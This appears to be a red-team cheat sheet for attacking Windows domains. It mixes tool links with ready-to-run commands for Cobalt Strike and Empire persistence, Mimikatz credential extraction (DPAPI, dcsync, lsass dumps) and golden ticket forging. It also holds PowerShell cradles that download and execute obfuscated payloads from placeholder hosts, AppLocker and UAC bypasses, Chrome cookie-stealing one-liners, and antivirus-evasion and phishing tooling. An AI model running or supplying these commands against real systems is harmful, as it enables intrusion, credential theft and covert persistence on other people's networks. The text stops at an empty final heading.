### Persistence with Microsoft Office
https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-1-microsoft-office/
### Persistence with COM Hijacking
https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-2-com-hijacking/
### Persistence with Wmi event subscription
https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/
-----------

-----------Prsistence, menu with all the persist scipts - CobaltStrike
# https://github.com/invokethreatguy/aggressor_scripts_collection/blob/master/Persistence/Persistence_Menu.cna
-----------

-----------Persistence (userland), scheduled task (schtask) - CobaltStrike
# https://github.com/harleyQu1nn/AggressorScripts/blob/master/Persistence/UserSchtasksPersist.cna
# (Persistence)->(Schtasks Persistence)
Schtasks Name: <Pepe>
User to run as: <user>
Target path: C:\Users\<user>\Music\
Scheduled Modifier: <ONSTART>,<ONLOGON>,<ONIDLE>,<DAILY /st 07:00>
DLL Payload: <example.dll>			--> Works with CobaltStrike generated .dll as uses "example.dll,StartW"
# schtasks /create /tn "Persistence" /tr "C:\Windows\System32\rundll32.exe C:\Users\Administrator\Music\example.dll,StartW" /ru "Administrator" /sc "ONSTART"
# schtasks /create /sc hourly /tn Taskname /tr "C:\Windows\System32\rundll32.exe C:\Users\Administrator\Music\example.dll,StartW"
-----------

-----------Persistence (userland) startup folder - CobaltStrike
# https://github.com/harleyQu1nn/AggressorScripts/blob/master/Persistence/StartUpFolderPersist.cna
# (Persistence)->(Windows Startup Persistence)
# Windows NT 6.0 - 10.0 / All Users
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
# Windows NT 6.0 - 10.0 / Current User
%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
# Windows NT 5.0 - 5.2
%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup
# Windows NT 3.5 - 4.0
%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\Startup
-----------

-----------Persistence (userland) add users to localgroups
Administrators group is too obvious.
Use Remote Desktop Users, Remote Management Users or Backup Operators.
-----------

-----------Persistence (userland) registry - CobaltStrike
# Options:
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
# Run:
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v EvilKey /t REG_SZ /d "C:\Some\Evil\Binary.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v EvilKey /t REG_SZ /d "C:\Some\Evil\Binary.exe"
-----------

-----------Persistence (with perivileges) - CobaltStrike
# Service:
https://github.com/harleyQu1nn/AggressorScripts/blob/master/Persistence/ServiceEXEPersist.cna
# Sticky keys:
https://github.com/invokethreatguy/aggressor_scripts_collection/blob/master/sticky-keys.cna
# Group Policy:
https://github.com/invokethreatguy/aggressor_scripts_collection/blob/master/Persistence/StartupGPOPersist.cna
# WMIC
https://github.com/invokethreatguy/aggressor_scripts_collection/blob/master/Persistence/WMICEventPersist.cna
# WMIE
https://github.com/invokethreatguy/aggressor_scripts_collection/blob/master/Persistence/WMIEventPersist.cna
-----------

-----------Persistence (userland and privileged) agressor scripts - CobaltStrike
# https://github.com/ZonkSec/persistence-aggressor-script
# Import script persistence.cna
### Userland:
persistence Add RegKeyRun pepe_example
persistence Add SchTasks OnTime Hourly pepe_example
persistence Add SchTasks OnLogon pepe_example
### Privileges:
persistence Add SchTasks OnStart pepe_example
persistence Add WMI OnStart pepe_example
-----------

-----------More persistence in userland (.lnk) - CobaltStrike
# https://www.fireeye.com/blog/threat-research/2019/09/sharpersist-windows-persistence-toolkit.html
# https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/
-----------

-----------Recon, PowerSploit - CobaltStrike
powershell-import	--> /media/sf_SharedVM/CSTools/PowerSploit/Recon/PowerView.ps1
powershell Invoke-EnumerateLocalAdmin
powerpick Get-NetGroupMember -GroupName "Domain Admins"
-----------

-----------Redirect ports - CobaltStrike
# https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/
socks 1337		--> in the beacon
proxychains socat TCP4-LISTEN:3389,fork TCP4:10.0.0.100:3389
-----------

-----------Windows Credentials Manager - Mimikatz
# https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/
# https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
powerpick Get-ChildItem C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\ -Force
mimikatz dpapi::cred /in:C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
wmic useraccount get name,sid
mimikatz dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1719172562-3308538836-3929312420-1104\cc6eb538-28f1-4ab4-adf2-f5594e88f0b2" /rpc
mimikatz dpapi::cred /in:C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
-----------

-----------Obfuscate Mimikatz
# https://blog.geoda-security.com/2018/05/running-obfuscated-version-of-mimikatz.html
-----------

-----------Run Mimikatz on memory though powershell
# Invoke-Mimos.ps1 is an obfuscated version of Invoke-Mimikatz.ps1
powershell.exe -version 2 -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://X.X.X.X/Invoke-Mimos.ps1'); Invoke-Mimos -Command '\"lsadump::dcsync /user:krbtgt\"'"
-----------

-----------Runas
runas /noprofile /user:testuser@foobar.com notepad
-----------

-----------DiskShadow - Copy Domain Controller database with low permissions
# https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/
-----------

-----------Silent persistence with Golden Tokens (Kerberos)
# http://www.hackplayers.com/2017/06/pivotando-con-golden-tickets-en-linux.html
# https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf
# http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/
# https://pentestlab.blog/2018/04/09/golden-ticket/
1- We steal the KRBTGT token with mimikatz
2- Generate a ticket to make pass-the-ticket impersonating any user (they can't avoid it just changing the credentials)
3- They need to reset the TGT credentials
# What do we need?
- Domain Name
- Domain SID
- Username to impersonate
- krbtgt NTLM hash
# How to get the NTLM hash of krbtgt?
- DCSync (Mimikatz)
- LSA (Mimikatz)
- Hashdump (Meterpreter)
- NTDS.DIT
- DCSync (Kiwi)
# Commands:
whoami /user		--> to get the DOMAIN NAME and SID
(mimikatz) lsadump::dcsync /user:krbtgt		--> to get the NTLM hash of krbtgt
(mimikatz) kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt		--> forge the ticket
-----------

-----------Command execution with dll injection (also external with webdav)
# https://github.com/p3nt4/PowerShdll
# requires .NET 3.5 minimum
rundll32 PowerShdll,main <script>
rundll32 PowerShdll,main -f <path>      --> Run the script passed as argument
rundll32 PowerShdll,main -w				--> Start an interactive console in a new window
rundll32 PowerShdll,main -i      		--> Start an interactive console in this console
rundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;
rundll32 \\example.com\PowerShdll,main <script>		--> from external webdav
-----------

-----------Empire alternative execution
# regsvr32
regsvr32 /u /n /s /i:payload.sct scrobj.dll
# MSBuild
"C:Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild" C:\z.xml			--> doesn't work with external webdav
# rundll32 with external (webdav) dll to bypass applocker
rundll32 \\prod-c1.com\PowerShdll32.dll,main "powershell -noP -sta -w 1 -enc  SQBmACgAJAB..."
# certutil
TODO
-----------

-----------Run beacons without rundll
# https://github.com/vysecurity/CACTUSTORCH
# https://github.com/rasta-mouse/TikiTorch
-----------

-----------RDP attacks
# https://pentestlab.blog/2018/04/24/lateral-movement-rdp/
# RDP Man-in-the-Middle
# RDP Inception
# RDP Session Hijacking
-----------

-----------Lateral movements
# https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f
PsExec
SC
WMI
WinRM
SchTasks
MSBuild
DCOM
Mshta
SMB Upload files
Rundll32
Regsvr32
-----------

-----------RDP hijack, run command and get clear text credentials
# https://github.com/SySS-Research/Seth
-----------

-----------Steal NTLM hash with PDF
# https://github.com/deepzec/Bad-Pdf
# http://www.hackplayers.com/2018/06/pdf-malicioso-para-robar-hashes-ntlm.html
# https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/
-----------

-----------Empire post exploitation modules
### Inject in another process (same permission level)
psinject <listener> <process_id>

### Bypass UAC to get high integrity
bypassuac

### Show a windows prompt to insert the credentials
powershell/collection/prompt

### Basic persistence, add to the register (run on startup)
persistence/userland/registry

### Basic persistence, add to the schedule task
persistence/userland/schtasks

### Take a screenshot (saved in empire/downloads/*/screenshots)
collection/screenshot

### Responder attack LLMNR
collection/inveigh
-----------

-----------Empire - autorun
### File:https.rc
listeners
uselistener http
set Name https
set DefaultProfile /admin/login.php,/console/dashboard.asp,/news/today.jsp| Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0);
set Host https://www.url.net:443
set Port 443
set CertPath ./data
execute

### File:autorun-ps.rc
agents
autorun /root/autorun.ps powershell

### File:autorun.ps
usemodule collection/screenshot
execute
back

### File:doitall.rc
resource /root/https.rc
resource /root/autorun-ps.rc

### run empire:
./empire --resource /root/doitall.rc
-----------

-----------Mimikatz thorugh wmic and .xls file
# https://gist.github.com/caseysmithrc/9b53bc3c1201cdce5d2d8663d868ebc6
wmic os get /format:"mimikatz.xls"
wmic os get /format:"http://127.0.0.1/mimikatz.xls"				--> served remotely
-----------

-----------RID Hijack - persistence with high integrity
# http://www.flu-project.com/2018/05/rid-hijacking-en-windows-10-que-es-y.htmld
-----------

-----------Koadic
# Post explotation tool alternative to Empire/Cobalt Strike/... which does most of its operations using Windows Script Host (a.k.a. JScript/VBScript)
# https://github.com/zerosum0x0/koadic
-----------

-----------SPN Discovery
# https://pentestlab.blog/2018/06/04/spn-discovery/
-----------

-----------Kerberoast
# https://pentestlab.blog/2018/06/12/kerberoast/
# https://github.com/nidem/kerberoast
-----------

-----------OpenOffice macros
# http://www.hackplayers.com/2018/06/shell-mediante-un-documento-odt.html
-----------

-----------Unicor tool - generate nice obfuscated macro, settingcontent-ms exploits
# https://github.com/trustedsec/unicorn
# https://www.trustedsec.com/2018/03/magic-unicorn-v3-0-released/
### Generate macro:
python unicorn cobalt_strike_file.cs cs macro				--> with the C# cobaltstrike generated payload
### Generate hta:
python unicorn cobalt_strike_file.cs cs hta					--> with the C# cobaltstrike generated payload
-----------

-----------Powershell bypass execution policy (that avoids script execution)
# https://www.hackplayers.com/2018/07/recopilatorio-bypasses-powershell-executionpolicy.html
-----------

-----------Phishing - Bypass Office 365 Protections
# https://resources.infosecinstitute.com/five-techniques-to-bypass-office-365-protections-used-in-real-phishing-campaigns/
-----------

-----------Powershell Red Team tools in C# - GhostPack
# GhostPack:
# http://www.harmj0y.net/blog/redteaming/ghostpack/
# .Net over .net. to pack the C# executables
# https://jimshaver.net/2018/07/25/safetykatz-over-net/
-----------

-----------DomLink - Discovery tool to find further associated domains
# https://github.com/vysec/DomLink
-----------

-----------LinkedInt - LinkedIn company mail scrapper
# https://github.com/vysec/LinkedInt/
-----------

-----------LeetLinked - works good
# https://github.com/Sq00ky/LeetLinked
-----------

-----------Mail validation
# https://github.com/trumail/trumail
# https://github.com/dafthack/MailSniper
# https://youtu.be/w1fNGOKkeSg?t=20m2s
-----------

-----------GreatSCT generates metasploit payloads that bypass common anti-virus solutions
# https://github.com/GreatSCT/GreatSCT
-----------

-----------PwnAuth is a web application framework for launching and managing OAuth abuse campaigns
# https://www.fireeye.com/blog/threat-research/2018/05/shining-a-light-on-oauth-abuse-with-pwnauth.html
# https://github.com/fireeye/PwnAuth
-----------

-----------ReelPhish is a 2FA phishing tool
# https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html
# https://github.com/fireeye/ReelPhish
-----------

-----------OS profiling via JavaScript
# https://github.com/keyzerrezyek/JQueryingU
-----------

-----------PowerSploit a Powershell post-exploitation tool ( powerview / powerup)
# https://github.com/PowerShellMafia/PowerSploit
### Recon
### Persistence
### Antivirus Bypass
### Prvilege Escalation
### Exfiltration
-----------

-----------SharpSploit a .NET (C#) post-exploitation tool like PowerSploit
# https://github.com/cobbr/SharpSploit
### Recon
### Persistence
### Antivirus Bypass
### Prvilege Escalation
### Exfiltration
# https://www.hackplayers.com/2018/10/sharpsploitconsole-usando-nuestra-dll.html					--> another tool less detected by AVs
-----------

-----------SilentTrinity a .NET post-exploitation tool using IronPython to avoid using powershell directly (requires .NET 4.5)
# https://github.com/byt3bl33d3r/SILENTTRINITY
# https://www.youtube.com/watch?v=NaFiAx737qg
# https://hausec.com/2018/10/12/the-rise-of-c-and-using-kali-as-a-c2-server-with-silenttrinity/
### Lighter version of Silenttrinity:
# https://github.com/byt3bl33d3r/OffensiveDLR/tree/master/Kukulkan
-----------

-----------Steal all Chrome cookies with one-liners commands
# https://www.hackplayers.com/2018/11/cookiecrimes-en-JS.html
# https://github.com/clr2of8/CookieCrimesJS
### Windows 10 - 64 Bit:
"%PROGRAMFILES(X86)%\Google\Chrome\Application\chrome.exe" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="%localAppData%/Google/Chrome/User Data" --disable-plugins https://clr2of8.github.io/CookieCrimesJS/

### Windows 10 - 32 Bit:
"%PROGRAMFILES%\Google\Chrome\Application\chrome.exe" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="%localAppData%/Google/Chrome/User Data" --disable-plugins https://clr2of8.github.io/CookieCrimesJS/

### Windows 7:
"%localAppData%\Google\Chrome\Application\chrome.exe" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="%localAppData%/Google/Chrome/User Data" --disable-plugins https://clr2of8.github.io/CookieCrimesJS/

### OS X:
"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="$HOME/Library/Application Support/Google/Chrome" --disable-plugins https://clr2of8.github.io/CookieCrimesJS/

### Linux:
google-chrome --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="~/.config/google-chrome/default" --disable-plugins https://clr2of8.github.io/CookieCrimesJS/

#Add a HTTP server with the next python script to get the POST request with the cookies.
### Related to: [---Python Simple HTTP server retrieve POST request]
-----------

-----------Steal credentials from browsers
# https://www.kitploit.com/2018/12/sharpweb-net-20-clr-project-to-retrieve.html
-----------

-----------Find expired domains with good reputation
# http://www.sectechno.com/domainhunter-checks-expired-domains-for-reputation/
# https://github.com/threatexpress/domainhunter
-----------

-----------Atomic Red Team – Test Endpoint Solutions Based on MITRE’s ATT&CK
# https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/index.md
-----------

-----------Data Exfiltration Toolkit (HTTP/S, ICMP, DNS, SMTP, Raw TCP, Google Docs, Twitter)
# Languages: python, powershell
# https://github.com/sensepost/DET
-----------

-----------SharpShooter - payload generator tool
# https://www.kitploit.com/2018/08/sharpshooter-payload-generation.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+PentestTools+%28PenTest+Tools%29
-----------

-----------HTML smuggling
# https://outflank.nl/blog/2018/08/14/html-smuggling-explained/
# https://itsecx.fhstp.ac.at/wp-content/uploads/2018/11/02_Rene_Freingruber_Flying_under_the_radar_freingruber_v1.00.pdf
# https://research.checkpoint.com/new-strain-of-olympic-destroyer-droppers/
# https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1
-----------

-----------Powershell auto-decryption scripts
# https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1
### Encryption:
powershell -command "import-module .\Out-EncryptedScript.ps1; Out-EncryptedScript .\secret_file.txt pepe_pass pepe_salt"
### Decryption:
powershell -command "import-module .\evil.ps1; de -b pepe_pass -c pepe_salt"
### Decryption from URL and execution:
powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://example.com/evil.ps1'); de -b pepe_pass -c pepe_salt | IEX"
### Decryption from URL and specific domain name:
powershell.exe -exec bypass -Command "$p=(New-Object Net.WebClient).DownloadString('https://www.X.X.X.X.com/favicon.ico') -replace \"`n\",\"\"; 
IEX (New-Object Net.WebClient).DownloadString('https://www.X.X.X.X.com/background.css');  $x=(Get-WmiObject Win32_ComputerSystem).Domain.ToLower(); 
$y=[int][char]$x[1]+[int][char]$x[13]; $s=\"666$y\"; de -b $p -c $s | IEX"
### Ready to Obfuscate with invoke-obfuscator:
SET SCRIPTBLOCK $p=(New-Object Net.WebClient).DownloadString('https://www.X.X.X.X.com/favicon.ico') -replace "`n",""; 
IEX (New-Object Net.WebClient).DownloadString('https://www.X.X.X.X.com/background.css');  
$x=(Get-WmiObject Win32_ComputerSystem).Domain.ToLower(); $y=[int][char]$x[1]+[int][char]$x[13]; $s="666$y"; de -b $p -c $s | IEX
-----------

-----------Watson - it looks for vulnerabilites in the system
# C# implementation of Sherlok - can run direcly from cobaltstrike
# https://github.com/rasta-mouse/Watson
beacon> execute-assembly C:\Users\Rasta\source\repos\Watson\Watson\bin\Debug\Watson.exe				--> from the local machine
-----------

-----------Empire without powershell (C#) (stage 1)
# https://plaintext.do/AV-Evasion-Converting-PowerEmpire-Stage-1-to-CSharp-EN/
# https://bneg.io/2017/07/26/empire-without-powershell-exe/
-----------

-----------powershell wihtout powershell comparison
# https://medium.com/@Bank_Security/how-to-running-powershell-commands-without-powershell-exe-a6a19595f628
-----------

-----------Elevate privileges with TrustedInsteller (admin -> system)
# Requires powershell v5
# https://www.hackplayers.com/2018/11/getsystem-trustedinstaller-parte-1.html
# https://www.hackplayers.com/2018/11/getsystem-trustedinstaller-parte-2.html
# https://www.securitynewspaper.com/2017/11/22/alternative-methods-becoming-system/
# https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
Install-Module NtObjectManager
New-Win32Process cmd.exe -CreationFlags Newconsole -ParentProcess (Get-NtProcess -Name lsass.exe)
-----------

-----------IP Obfuscator
# https://www.kitploit.com/2018/12/ip-obfuscator-simple-tool-to-convert-ip.html
# https://github.com/D4Vinci/Cuteit
### https://127.0.0.1
* Using http://2130706433 form
	[0] http://howsecureismypassword.net@2130706433
	[1] http://google.com@accounts@2130706433
	[2] https://www.facebook.com+settings&tab=privacy@2130706433
-----------

-----------Maleable randomizer - Cobalt Strike
https://github.com/bluscreenofjeff/Malleable-C2-Randomizer/tree/master/Sample%20Templates
-----------

-----------Vbad - Visual Basic obfuscator (vba)
# https://github.com/Pepitoh/VBad
-----------

-----------Visual Basic (vba) hide malicious payloads
# https://medium.com/walmartlabs/vba-stomping-advanced-maldoc-techniques-612c484ab278
-----------

-----------Powershell Script For Enumerating Vulnerable DCOM Applications
# https://github.com/sud0woodo/DCOMrade
-----------

-----------WinRAR exploit RCE
# https://research.checkpoint.com/extracting-code-execution-from-winrar/
# # https://github.com/WyAtu/CVE-2018-20250
-----------

-----------Phishing agains office365 - get rid of its robots
# https://blog.sublimesecurity.com/red-team-techniques-gaining-access-on-an-external-engagement-through-spear-phishing/
-----------

-----------Windows interesting URI schemas (TODO)
# https://leucosite.com/Microsoft-Edge-RCE/
# https://docs.microsoft.com/en-us/office/client-developer/office-uri-schemes
# https://www.iana.org/assignments/uri-schemes/uri-schemes.xhtml
# https://0x00sec.org/t/using-uri-to-pop-shells-via-the-discord-client/11673
aaa
aaas
about
acap
acct
acr
adiumxtra
afp
afs
aim
appdata
apt
attachment
aw
barion
beshare
bitcoin
bitcoincash
blob
bolo
browserext
calculator
callto
cap
chrome
chrome-extension
cid
coap
coap+tcp
coap+ws
coaps
coaps+tcp
coaps+ws
com-eventbrite-attendee
content
conti
crid
cvs
data
dav
diaspora
dict
did
dis
dlna-playcontainer
dlna-playsingle
dns
dntp
dpp
dtn
dvb
ed2k
elsi
example
facetime
fax
feed
feedready
file
filesystem
finger
fish
ftp
geo
gg
git
gizmoproject
go
gopher
graph
gtalk
h323
ham
hcap
hcp
http
https
hxxp
hxxps
hydrazone
iax
icap
icon
im
imap
info
iotdisco
ipn
ipp
ipps
irc
irc6
ircs
iris
iris.beep
iris.lwz
iris.xpc
iris.xpcs
isostore
itms
jabber
jar
jms
keyparc
lastfm
ldap
ldaps
leaptofrogans
lvlt
magnet
mailserver
mailto
maps
market
message
microsoft.windows.camera
microsoft.windows.camera.multipicker
microsoft.windows.camera.picker
mid
mms
modem
mongodb
moz
ms-access
ms-browser-extension
ms-calculator
ms-drive-to
ms-enrollment
ms-excel
ms-eyecontrolspeech
ms-gamebarservices
ms-gamingoverlay
ms-getoffice
ms-help
ms-infopath
ms-inputapp
ms-lockscreencomponent-config
ms-media-stream-id
ms-mixedrealitycapture
ms-mobileplans
ms-officeapp
ms-people
ms-project
ms-powerpoint
ms-publisher
ms-restoretabcompanion
ms-screenclip
ms-screensketch
ms-search
ms-search-repair
ms-secondary-screen-controller
ms-secondary-screen-setup
ms-settings
ms-settings-airplanemode
ms-settings-bluetooth
ms-settings-camera
ms-settings-cellular
ms-settings-cloudstorage
ms-settings-connectabledevices
ms-settings-displays-topology
ms-settings-emailandaccounts
ms-settings-language
ms-settings-location
ms-settings-lock
ms-settings-nfctransactions
ms-settings-notifications
ms-settings-power
ms-settings-privacy
ms-settings-proximity
ms-settings-screenrotation
ms-settings-wifi
ms-settings-workplace
ms-spd
ms-sttoverlay
ms-transit-to
ms-useractivityset
ms-virtualtouchpad
ms-visio
ms-walk-to
ms-whiteboard
ms-whiteboard-cmd
ms-word
msnim
msrp
msrps
mss
mtqp
mumble
mupdate
mvn
news
nfs
ni
nih
nntp
notes
ocf
oid
onenote
onenote-cmd
opaquelocktoken
openpgp4fpr
pack
palm
paparazzi
payto
pkcs11
platform
pop
pres
prospero
proxy
pwid
psyc
qb
query
redis
rediss
reload
res
resource
rmi
rsync
rtmfp
rtmp
rtsp
rtsps
rtspu
secondlife
service
session
sftp
sgn
shttp
sieve
simpleledger
sip
sips
skype
smb
sms
smtp
snews
snmp
soap.beep
soap.beeps
soldat
spiffe
spotify
ssh
steam
stun
stuns
submit
svn
tag
teamspeak
tel
teliaeid
telnet
tftp
things
thismessage
tip
tn3270
tool
turn
turns
tv
udp
unreal
urn
ut2004
v-event
vemmi
ventrilo
videotex
vnc
view-source
wais
webcal
wpid
ws
wss
wtai
wyciwyg
xcon
xcon-userid
xfire
xmlrpc.beep
xmlrpc.beeps
xmpp
xri
ymsgr
z39.50
z39.50r
-----------

-----------RT toolkit
# https://github.com/infosecn1nja/Red-Teaming-Toolkit
-----------

-----------DNS request trought HTTPs and google.com
curl -s -H 'Host: dns.google.com' 'https://google.com/resolve?name=www.octority.com&type=A'
-----------

-----------2FA proxying - social engineering
### Evilginx2:
# https://github.com/kgretzky/evilginx2
### Modlishka:
# https://github.com/drk1wi/Modlishka
-----------

-----------Signing binaries to bypass AVs
# https://github.com/paranoidninja/CarbonCopy
# https://astr0baby.wordpress.com/2019/01/26/custom-meterpreter-loader-in-2019/
# https://github.com/paranoidninja/CarbonCopy
-----------

-----------Security Descryptors (Windows - Bloodhound)
# https://drive.google.com/file/d/1bMk9erEATvb0nzCrRvk4Xdru3v49zBga/view
-----------

-----------Install/run bloodhound
# https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux
neo4j console
bloodhound
-----------

-----------Bloodhound custom queries
# https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json
# List all owned users
MATCH (m:User) WHERE m.owned=TRUE RETURN m

# List all owned computers
MATCH (m:Computer) WHERE m.owned=TRUE RETURN m

# List all owned groups
MATCH (m:Group) WHERE m.owned=TRUE RETURN m

# List all High Valued Targets
MATCH (m) WHERE m.highvalue=TRUE RETURN m

# List the groups of all owned users
MATCH (m:User) WHERE m.owned=TRUE WITH m MATCH p=(m)-[:MemberOf*1..]->(n:Group) RETURN p

# Find all Kerberoastable Users
MATCH (n:User)WHERE n.hasspn=true RETURN n

# Find All Users with an SPN/Find all Kerberoastable Users with passwords last set less than 5 years ago
MATCH (u:User) WHERE u.hasspn=true AND u.pwdlastset < (datetime().epochseconds - (1825 * 86400)) AND NOT u.pwdlastset IN [-1.0, 0.0] RETURN u.name, u.pwdlastset order by u.pwdlastset 

# Find Kerberoastable Users with a path to DA
MATCH (u:User {hasspn:true}) MATCH (g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p = shortestPath( (u)-[*1..]->(g) ) RETURN p

# Find machines Domain Users can RDP into
match p=(g:Group)-[:CanRDP]->(c:Computer) where g.objectid ENDS WITH '-513' return p

# Find what groups can RDP
MATCH p=(m:Group)-[r:CanRDP]->(n:Computer) RETURN p

# Find groups that can reset passwords (Warning: Heavy)
MATCH p=(m:Group)-[r:ForceChangePassword]->(n:User) RETURN p

# Find groups that have local admin rights (Warning: Heavy)
MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN p

# Find all users that have local admin rights
MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN p

# Find all active Domain Admin sessions
MATCH (n:User)-[:MemberOf]->(g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p = (c:Computer)-[:HasSession]->(n) return p

# Find all computers with Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation:true}) return c

# Find all computers with unsupported operating systems
MATCH (H:Computer) WHERE H.operatingsystem =~ '.*(2000|2003|2008|xp|vista|7|me)*.' RETURN H

# Find users that logged in within the last 90 days
MATCH (u:User) WHERE u.lastlogon < (datetime().epochseconds - (90 * 86400)) and NOT u.lastlogon IN [-1.0, 0.0] RETURN u

# Find users with passwords last set within the last 90 days and enabled
MATCH (u:User) WHERE u.pwdlastset < (datetime().epochseconds - (90 * 86400)) and NOT u.pwdlastset IN [-1.0, 0.0] and u.enabled=TRUE RETURN u

# Find constrained delegation
MATCH p=(u:User)-[:AllowedToDelegate]->(c:Computer) RETURN p

# Find computers that allow unconstrained delegation that AREN’T domain controllers.
MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2:Computer {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2

# Return the name of every computer in the database where at least one SPN for the computer contains the string 'MSSQL'
MATCH (c:Computer) WHERE ANY (x IN c.serviceprincipalnames WHERE toUpper(x) CONTAINS 'MSSQL') RETURN c

# View all GPOs
Match (n:GPO) RETURN n

# View all groups that contain the word 'admin'
Match (n:Group) WHERE n.name CONTAINS 'ADMIN' RETURN n

# Find users that can be AS-REP roasted
MATCH (u:User {dontreqpreauth: true}) RETURN u

# Find All Users with an SPN/Find all Kerberoastable Users with passwords last set > 5 years ago
MATCH (u:User) WHERE n.hasspn=true AND WHERE u.pwdlastset < (datetime().epochseconds - (1825 * 86400)) and NOT u.pwdlastset IN [-1.0, 0.0] RETURN u

# Show all high value target's groups
MATCH p=(n:User)-[r:MemberOf*1..]->(m:Group {highvalue:true}) RETURN p

# Find groups that contain both users and computers
MATCH (c:Computer)-[r:MemberOf*1..]->(groupsWithComps:Group) WITH groupsWithComps MATCH (u:User)-[r:MemberOf*1..]->(groupsWithComps) RETURN DISTINCT(groupsWithComps) as groupsWithCompsAndUsers

# Find Kerberoastable users who are members of high value groups
MATCH (u:User)-[r:MemberOf*1..]->(g:Group) WHERE g.highvalue=true AND u.hasspn=true RETURN u

# Find Kerberoastable users and where they are AdminTo
OPTIONAL MATCH (u1:User) WHERE u1.hasspn=true OPTIONAL MATCH (u1)-[r:AdminTo]->(c:Computer) RETURN u

# Find computers with constrained delegation permissions and the corresponding targets where they allowed to delegate
MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c

# Find if any domain user has interesting permissions against a GPO (Warning: Heavy)
MATCH p=(u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|GpLink*1..]->(g:GPO) RETURN p

# Find if unprivileged users have rights to add members into groups
MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) RETURN p

# Find all users a part of the VPN group
Match p=(u:User)-[:MemberOf]->(g:Group) WHERE toUPPER (g.name) CONTAINS 'VPN' return p

# Find users that have never logged on and account is still active
MATCH (n:User) WHERE n.lastlogontimestamp=-1.0 AND n.enabled=TRUE RETURN n 

# Find an object in one domain that can do something to a foreign object
MATCH p=(n)-[r]->(m) WHERE NOT n.domain = m.domain RETURN p

# Find all sessions a user in a specific domain has
MATCH (n:Domain) RETURN n.name ORDER BY n.name
MATCH p=(m:Computer)-[r:HasSession]->(n:User {domain:{result}}) RETURN p

# Find an object from domain 'A' that can do anything to a foreign object
MATCH (n:Domain) RETURN n.name ORDER BY n.name
MATCH p=(n {domain:{result}})-[r]->(d) WHERE NOT d.domain=n.domain RETURN p
-----------

-----------Get System from Admin
pasexec64.exe -i -s cmd
-----------

-----------Dump lssass
procdump -accepteula -ma lsass.exe lsass_dump
# with mimikatz
sekurlsa::Minidump lsassdump.dmp
sekurlsa::logonPasswords
-----------

-----------Services accounts
# https://adsecurity.org/?p=2362#more-2362
-----------

-----------Cylance bypass
